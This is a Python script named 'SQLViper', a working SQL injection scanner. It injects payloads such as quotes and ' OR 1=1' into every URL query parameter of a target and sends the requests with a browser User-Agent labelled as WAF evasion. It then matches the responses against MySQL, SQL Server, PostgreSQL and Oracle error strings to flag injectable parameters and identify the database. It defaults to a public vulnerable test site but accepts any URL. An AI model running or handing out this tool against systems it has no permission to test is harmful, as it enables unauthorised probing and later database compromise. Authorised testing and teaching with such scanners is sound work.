import requests
import sys
import urllib.parse as urlparse
from colorama import Fore, Style, init

# Initialize colorama for colored terminal output
init(autoreset=True)

# --- CONFIGURATION ---
# A list of payloads to test different types of SQL logic errors
PAYLOADS = [
    "'", 
    '"', 
    " OR 1=1", 
    "' OR '1'='1", 
    "--", 
    ";"
]

# Common SQL error signatures (Database Fingerprinting)
SQL_ERRORS = {
    "MySQL": ["You have an error in your SQL syntax", "check the manual that corresponds to your MySQL server version"],
    "SQL Server": ["Unclosed quotation mark after the character string", "Incorrect syntax near"],
    "PostgreSQL": ["syntax error at or near", "unterminated quoted string"],
    "Oracle": ["ORA-01756", "quoted string not properly terminated"],
    "General": ["SQL syntax", "SQL error"]
}

# Headers to mimic a real browser (WAF Evasion - Basic)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

class SQLViper:
    def __init__(self, url):
        self.target_url = url
        self.vulnerable = False

    def get_query_params(self, url):
        """
        Parses the URL and returns a dictionary of parameters.
        Example: ?id=1&name=test -> {'id': '1', 'name': 'test'}
        """
        parsed = urlparse.urlparse(url)
        return urlparse.parse_qs(parsed.query)

    def construct_url(self, url, params):
        """
        Reconstructs the URL with modified parameters.
        """
        parsed = urlparse.urlparse(url)
        # Convert dictionary back to query string
        new_query = urlparse.urlencode(params, doseq=True)
        # Rebuild the full URL
        return parsed._replace(query=new_query).geturl()

    def scan(self):
        print(f"{Fore.CYAN}[*] Starting scan on: {self.target_url}")
        
        # 1. Identify Parameters
        params = self.get_query_params(self.target_url)
        if not params:
            print(f"{Fore.YELLOW}[-] No parameters found to inject. (e.g., ?id=1). Exiting.")
            return

        print(f"{Fore.BLUE}[*] Found {len(params)} parameter(s) to test: {list(params.keys())}")

        # 2. Fuzz Each Parameter
        for param_name in params:
            print(f"\n{Fore.CYAN}[*] Testing parameter: '{param_name}'")
            original_value = params[param_name][0] # parse_qs returns a list, get the first item

            for payload in PAYLOADS:
                # Create a copy of params to modify just this one
                test_params = params.copy()
                # Inject the payload
                test_params[param_name] = original_value + payload
                
                # Build the malicious URL
                attack_url = self.construct_url(self.target_url, test_params)
                
                # Send the attack
                self._send_request(attack_url, payload, param_name)
                
                if self.vulnerable:
                    # If we found a vuln in this parameter, stop testing other payloads for it
                    break 

    def _send_request(self, url, payload, param_name):
        try:
            # We use a short timeout because we don't want to hang on slow servers
            response = requests.get(url, headers=HEADERS, timeout=5)
            
            # Check for errors
            for db_type, errors in SQL_ERRORS.items():
                for error in errors:
                    if error in response.text:
                        print(f"{Fore.RED}[!!!] SQL INJECTION DETECTED [!!!]")
                        print(f"{Fore.RED}    > Parameter: {param_name}")
                        print(f"{Fore.RED}    > Payload:   {payload}")
                        print(f"{Fore.RED}    > Database:  {db_type}")
                        print(f"{Fore.YELLOW}    > Link:      {url}")
                        self.vulnerable = True
                        return

            # If no error, print a subtle progress indicator
            print(f"{Fore.GREEN}[+] Payload '{payload}' failed (Safe response).")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[!] Connection Error: {e}")

if __name__ == "__main__":
    # Default safe target for demonstration
    target = "http://testphp.vulnweb.com/artists.php?artist=1"
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        
    scanner = SQLViper(target)
    scanner.scan()